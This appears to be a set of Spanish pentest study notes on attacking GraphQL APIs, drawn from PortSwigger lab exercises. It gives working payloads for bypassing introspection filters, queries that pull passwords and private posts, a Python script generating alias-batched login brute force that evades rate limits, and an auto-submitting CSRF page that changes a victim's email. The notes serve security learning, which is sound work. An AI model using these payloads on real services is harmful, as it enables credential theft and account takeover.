
---
Tags: #introspeccion #graphql #query #burpsuite #bypass

---
# Índice de Contenidos

- [[#1 Introducción a la Seguridad Ofensiva en GraphQL]]
    
- [[#2 Descubrimiento y Reconocimiento de Endpoints]]
    - [[#Endpoints Comunes de GraphQL]]
    - [[#Bypass de Sanitización Básica]]
    
- [[#3 Abuso de la Introspección (Introspection)]]
    - [[#Uso de Herramientas Burp Suite (GraphQL Extension)]]
    
- [[#4 Fuga de Información y Acceso a Datos Privados]]
    - [[#4.1 Acceso a Publicaciones Privadas]]
    - [[#4.2 Exposición Accidental de Campos Sensibles (Users)]]
	
- [[#5. Bypass de Rate Limiting y Fuerza Bruta con Aliases]]
	- [[#Explotación y Automatización (Python PoC)]]
	
- [[#6. Explotación CSRF a través de GraphQL]]
	- [[#Transformación del Payload]]
	
- [[#7. Tabla Resumen / Cheat Sheet]]
	- [[#7.1 Bypasses Avanzados de Introspección]]
	- [[#7.2 PoC Bypass mediante Comentarios y Fragmentos]]
	
- [[#Herramienta Especial GraphQLmap / InQL]]
	
- [[#Tabla Resumen de Caracteres para Evasión]]
	
- [[#8. Referencias y Herramientas]]
	
---

## 1. Introducción a la Seguridad Ofensiva en GraphQL

GraphQL es un lenguaje de consulta para APIs que permite a los clientes solicitar exactamente los datos que necesitan. A diferencia de las APIs REST, que exponen múltiples endpoints para diferentes recursos, GraphQL expone típicamente **un único endpoint** que maneja consultas complejas.

Desde una perspectiva ofensiva, el objetivo principal en GraphQL es **entender el esquema (schema)** subyacente. Si logramos mapear las consultas (queries) y mutaciones (mutations) permitidas, podemos buscar fallos lógicos, controles de acceso deficientes (BOLA/IDOR) o fugas de información.

---

## 2. Descubrimiento y Reconocimiento de Endpoints

El primer paso en un pentest sobre una aplicación que sospechamos usa GraphQL es encontrar su endpoint de comunicación. Aunque a veces es evidente en el tráfico de red, en ocasiones los desarrolladores intentan ocultarlo (Security through obscurity).

### Endpoints Comunes de GraphQL

A continuación, una tabla con los directorios más comunes que debes fuzzeo durante la fase de reconocimiento:

|**Categoría**|**Endpoints Frecuentes**|**Descripción**|
|---|---|---|
|**Básicos**|`/graphql`, `/graphiql`|Rutas estándar por defecto.|
|**Versionados**|`/v1/graphql`, `/v2/graphql`, `/v3/graphql`|Comunes en APIs maduras.|
|**Interfaces Visuales**|`/playground`, `/console`, `/explorer`|Consolas de depuración que los devs olvidan desactivar en producción.|
|**Anidados en API**|`/api/graphql`, `/api/v1/graphql`|Estructuras típicas cuando GraphQL convive con REST.|

### Bypass de Sanitización Básica

En ocasiones, el endpoint está protegido por un WAF (Web Application Firewall) o reglas de enrutamiento que bloquean peticiones directas a consultas sensibles (como `__schema`).

**Técnica de Bypass con `%0a` (Salto de línea):**

Los filtros mal configurados suelen evaluar las cadenas basándose en expresiones regulares que no tienen en cuenta los saltos de línea. Al inyectar un carácter de salto de línea codificado en URL (`%0a`), podemos evadir la validación.

**PoC (Prueba de Concepto):**

Si el servidor bloquea la consulta directa `__schema`, probamos a romper la expresión regular inyectando `%0a` justo antes del objeto a consultar:

```HTTP
GET /api?query=query+IntrospectionQuery+%7b%0a++++__schema%0a+%7b%0a++++++++queryType+%7b%0a...
```

> **Nota de pentesting:** Esta técnica aprovecha que el analizador léxico de GraphQL (parser) ignora los espacios en blanco y los saltos de línea, pero el WAF superficial no sabe interpretarlos correctamente, permitiendo el paso del payload.

---

## 3. Abuso de la Introspección (Introspection)

La introspección es una característica nativa de GraphQL que permite consultar al propio servidor qué recursos soporta. Si está habilitada en producción, es una mina de oro: nos entrega el mapa completo de la API.

### Uso de Herramientas: Burp Suite (GraphQL Extension)

Para explotar esto de forma eficiente, la integración de GraphQL en **Burp Suite** es fundamental.

1. **Set Introspection Query:** Si detectamos una petición a GraphQL en el _Repeater_, hacemos `Click Derecho > GraphQL > Set introspection query`. Burp generará automáticamente la consulta `__schema` óptima para volcar la base de datos de tipos.
    
2. **Save to Site map:** La respuesta de una introspección es un JSON enorme e ilegible para el ojo humano. Al hacer `Click Derecho > GraphQL > Save to Site map`, Burp parsea ese JSON y genera una estructura de árbol visual en la pestaña `Target > Site map`. Esto nos permite navegar por las Queries y Mutations disponibles de manera intuitiva, viendo los campos y tipos de datos (String, Int, Boolean, etc.) requeridos.
    

---

## 4. Fuga de Información y Acceso a Datos Privados

Una vez que tenemos el esquema gracias a la introspección (o por fuerza bruta de campos), el siguiente paso es probar fallos en el control de acceso.

### 4.1 Acceso a Publicaciones Privadas

Muchos desarrolladores asumen que si no muestran el enlace a un recurso privado en el frontend (como un blog oculto), nadie podrá acceder a él. Sin embargo, GraphQL expone las consultas para todos.

**PoC - Volcado del Esquema Inicial:**

```JSON
{
  "query": "{\n  __schema {\n    types {\n      name\n      fields {\n        name\n        type {\n          name\n          kind\n        }\n      }\n    }\n  }\n}"
}
```

**PoC - Explotación:**

Al analizar el esquema, descubrimos el objeto `getBlogPost`. Iterando sobre el campo `id`, podemos extraer contenido privado, incluyendo contraseñas de posts que no deberían ser públicos:

```JSON
{
  "query": "query { getBlogPost(id: 3) { id title summary postPassword isPrivate } }"
}
```

### 4.2 Exposición Accidental de Campos Sensibles (Users)

En REST, un endpoint `/api/users/1` suele devolver un modelo de datos fijo. En GraphQL, el cliente pide qué campos quiere. Un error crítico muy común es definir campos como `password`, `hash`, o `resetToken` en el tipo de dato `User` de GraphQL, permitiendo que cualquiera los consulte.

**PoC - Explotación (Extracción de credenciales):**

Gracias a que hemos guardado la introspección en el Site Map, vemos que el objeto `getUser` permite solicitar el campo `password`.

```JSON
{
  "query": "{ getUser(id: 1) { username password } }"
}
```

> **Nota de pentesting:** En auditorías reales, revisa siempre los objetos `User`, `Admin`, `Settings` o similares. Busca campos que un frontend normal nunca solicitaría.

---

## 5. Bypass de Rate Limiting y Fuerza Bruta con Aliases

Uno de los vectores de ataque más potentes en GraphQL es abusar de la funcionalidad de **Aliases** (Alias). Los desarrolladores suelen implementar protecciones de _Rate Limiting_ (límite de peticiones) basándose en la cantidad de peticiones HTTP que llegan desde una misma IP. Sin embargo, GraphQL permite empaquetar múltiples consultas o mutaciones en **una sola petición HTTP**.

### Descubrimiento y Concepto

Si detectamos un endpoint de _login_ (mutación) y vemos que tras 5 o 10 intentos fallidos el servidor nos bloquea (HTTP 429 Too Many Requests), podemos intentar evadirlo. Usando aliases, renombramos cada llamada dentro del mismo payload JSON. Como es una sola petición HTTP, el WAF o el sistema de Rate Limiting a nivel de red no lo detecta como un ataque iterativo.

### Explotación y Automatización (Python PoC)

Para no escribir cientos de mutaciones a mano, usamos este script en Python que itera sobre un diccionario (`pass.txt`) y genera el payload JSON malicioso. Cada intento lleva un alias único (`Intento_X:`) para que el motor de GraphQL no devuelva un error de colisión de nombres.

```Python
#!/usr/bin/python3

# Script para generar payload de fuerza bruta usando Aliases en GraphQL
with open("pass.txt") as f:
    lines = [line.strip() for line in f if line.strip()]

# Iniciamos el JSON y la mutación con un salto de línea
print('{')
print('  "query": "mutation {\\n', end="")

for i, password in enumerate(lines):
    count = i + 1
    # Cada intento en una línea nueva dentro del string
    # Usamos \\n para que el JSON contenga el salto de línea literal necesario para la sintaxis
    line_str = f'    Intento_{count}: login(input: {{username: \\"carlos\\", password: \\"{password}\\"}}) {{ token success }}\\n'
    print(line_str, end="")

# Cerramos la mutación y el objeto JSON
print('  }"')
print('}')
```

> **Nota de pentesting:** Al enviar este gran bloque JSON generado por el script, el servidor procesará secuencialmente cada `login`. Si alguno tiene éxito, la respuesta JSON contendrá el token de sesión asociado a ese alias específico.

---

## 6. Explotación CSRF a través de GraphQL

Las vulnerabilidades de Cross-Site Request Forgery (CSRF) ocurren cuando forzamos al navegador de una víctima autenticada a ejecutar una acción no deseada. Por defecto, GraphQL usa el `Content-Type: application/json`. Los navegadores modernos, debido a las políticas CORS, envían una petición pre-vuelo (`OPTIONS`) antes de enviar un POST con JSON cross-origin, lo que suele mitigar el CSRF.

Sin embargo, si logramos que el servidor procese la petición usando un `Content-Type` tradicional de formularios HTML, podemos evadir esta protección.

### ¿Cómo saber si el servidor acepta otro Content-Type?

En **Burp Suite (Repeater)**, tomamos la petición JSON original que realiza una acción sensible (como cambiar un email). Cambiamos la cabecera `Content-Type: application/json` por `Content-Type: application/x-www-form-urlencoded`. Luego, reformateamos el Body de JSON a parámetros URL-encoded. Si el servidor responde con un `200 OK` y ejecuta la acción, **es vulnerable a CSRF**.

### Transformación del Payload

Pasamos de la petición JSON original:

```JSON
{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"test@test.com"}}}
```

A su equivalente en `x-www-form-urlencoded`:

```HTTP
query=mutation+changeEmail($input:+ChangeEmailInput!)+{+changeEmail(input:+$input)+{+email+}+}+&operationName=changeEmail&variables={"input":{"email":"teeest@test.com"}}
```

### Explotación (Generación de PoC en Burp)

Una vez validado en el Repeater, hacemos `Click Derecho > Engagement tools > Generate CSRF PoC`. Burp Suite nos generará un código HTML que enviaremos a la víctima (por ejemplo, alojándolo en un servidor controlado por nosotros o Exploit Server).

**HTML Malicioso (PoC):**

```HTML
<html>
  <body>
    <form action="https://0a79007a04d6a11480efdf7f00170028.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#32;email&#32;&#125;&#32;&#125;&#32;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;teeest&#64;test&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      // Ejecución automática al cargar la página
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Cuando la víctima visita la página, su navegador envía este formulario POST adjuntando automáticamente sus cookies de sesión, cambiando su correo sin su consentimiento.

---

## 7. Tabla Resumen / Cheat Sheet

Para tenerlo a mano de un vistazo rápido durante tus auditorías:

|**Vector de Ataque**|**Requisito Principal**|**Herramienta/Técnica**|**Bypass/Mitigación Rota**|
|---|---|---|---|
|**Descubrimiento Oculto**|Fuzzeo de directorios|Diccionarios (ffuf/gobuster)|N/A|
|**Bypass Filtro Introspección**|Bloqueo básico de `__schema`|Inyección de salto de línea|`%0a` antes de `__schema`|
|**Fuga de Datos Sensibles**|Introspección habilitada|`Burp > Save to Site map`|Exposición de `isPrivate`, `password`|
|**Bypass Rate Limiting**|Bloqueo por IP/Peticiones|Mutaciones agrupadas|Uso de **Aliases** (`Intento_1:`)|
|**Explotación CSRF**|Mutaciones sin token CSRF|Cambio de `Content-Type`|`application/x-www-form-urlencoded`|

### 7.1 [[#Bypasses Avanzados de Introspección]]

Cuando un servidor bloquea la palabra `__schema`, no siempre significa que la introspección esté desactivada; a veces solo hay una lista negra (blacklist) mal implementada.

|**Técnica**|**Payload de Ejemplo**|**Por qué funciona**|
|---|---|---|
|**Salto de Línea (URL Encoded)**|`%0a__schema`|Evade RegEx sencillas que buscan la palabra al inicio de la línea.|
|**Comentarios de GraphQL**|`# esto es un comentario \n __schema`|El WAF ve el comentario, pero el parser de GraphQL ignora el `#` y ejecuta lo siguiente.|
|**Comas Ignoradas**|`, , , __schema`|En GraphQL, las comas son tratadas como espacios en blanco. Muchos WAFs no esperan comas antes de una query.|
|**Fragmentos (Fragments)**|`fragment F on __Schema { types { name } }`|Define la estructura en un fragmento para que la palabra prohibida no esté en la consulta principal.|
|**Alias de Introspección**|`query { alias_name: __schema { ... } }`|A veces el filtro busca `__schema` seguido de un espacio, no de dos puntos.|

---

### 7.2 PoC: Bypass mediante Comentarios y Fragmentos

Si el servidor tiene un filtro muy agresivo, podemos usar **Fragmentos**. Esta es una de las técnicas más reputadas porque separa la definición de la ejecución, rompiendo la mayoría de las firmas de los WAF.

**Petición original (Bloqueada):**

JSON

```
{ "query": "{ __schema { types { name } } }" }
```

**Petición con Bypass (Fragmento + Comentario):**

JSON

```
{
  "query": "query Bypass { ...F1 } # Comentario \n fragment F1 on __Schema { types { name } }"
}
```

> **Explicación técnica:** Aquí estamos haciendo dos cosas. Primero, usamos un alias/fragmento (`...F1`) para llamar al esquema. Segundo, definimos el fragmento al final. El parser de GraphQL reconstruirá la consulta, pero el firewall a menudo se confunde al no ver la palabra clave inmediatamente después de la apertura de llaves.

### Herramienta Especial: GraphQLmap / InQL

Para descubrir estos bypasses de forma automática, te recomiendo usar **InQL** (extensión de Burp) o **GraphQLmap**.

- **InQL:** Te permite alternar entre queries y mutaciones rápidamente y tiene un generador automático de ciclos para probar si el servidor se cae (DoS).
    
- **GraphQLmap:** Es excelente para probar estos bypasses de caracteres especiales automáticamente.
    

---

### Tabla Resumen de Caracteres para Evasión

Puedes usar estos caracteres de forma intercambiable para intentar "confundir" al validador:

- **Espacios horizontales:** (Space), `\t` (Tab).
    
- **Saltos de línea:** `\n` (Newline), `\r` (Carriage return).
    
- **Puntuación:** `,` (Comas).
    
- **Comentarios:** `#` (Todo lo que sigue en la línea es ignorado).
---

## 8. Referencias y Herramientas

Para mantener estos apuntes actualizados y ampliar payloads, te recomiendo estas fuentes:

- **PayloadsAllTheThings (GraphQL Injection):** Un repositorio imprescindible con decenas de payloads de introspección, inyecciones de base de datos a través de GraphQL y bypasses de WAF. [🔗 Repositorio GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
    
- **PortSwigger Web Security Academy (GraphQL API vulnerabilities):** El estándar de la industria para practicar estos conceptos en laboratorios interactivos (de donde provienen gran parte de estos apuntes). [🔗 Academia PortSwigger](https://portswigger.net/web-security/graphql)